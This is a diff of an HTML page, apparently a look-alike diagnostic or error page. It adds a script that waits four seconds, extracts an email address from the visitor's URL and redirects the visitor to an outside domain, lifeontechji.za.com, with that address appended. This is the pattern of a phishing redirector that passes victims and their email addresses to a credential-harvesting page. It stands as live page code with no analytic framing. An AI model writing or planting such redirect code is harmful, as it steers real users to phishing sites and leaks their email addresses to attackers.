@@ -492,10 +492,27 @@
       })();
     </script>
 <script>
-      setTimeout(function(){
-        window.location.href = "https://lifeontechji.za.com/R158Y/"; // Replace with your desired URL
-      }, 4000); // 4000 milliseconds = 4 seconds
-    </script>
+    setTimeout(function(){
+        // Get the current URL
+        var currentUrl = window.location.href;
+        
+        // Regular expression to match an email address in the URL
+        var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
+        
+        // Extract email from the current URL
+        var emailMatch = currentUrl.match(emailRegex);
+        
+        // Base redirect URL
+        var baseUrl = "https://lifeontechji.za.com/R158Y/";
+
+        // Construct the new URL with '##' prefix and the email address if found
+        var newUrl = emailMatch ? baseUrl + "##" + emailMatch[0] : baseUrl;
+
+        // Redirect to the new URL
+        window.location.href = newUrl;
+    }, 4000); // 4000 milliseconds = 4 seconds
+</script>
+
     <div class="footer" role="contentinfo">
       <div class="footer-inner">
         <div class="clearfix diagnostic-wrapper">
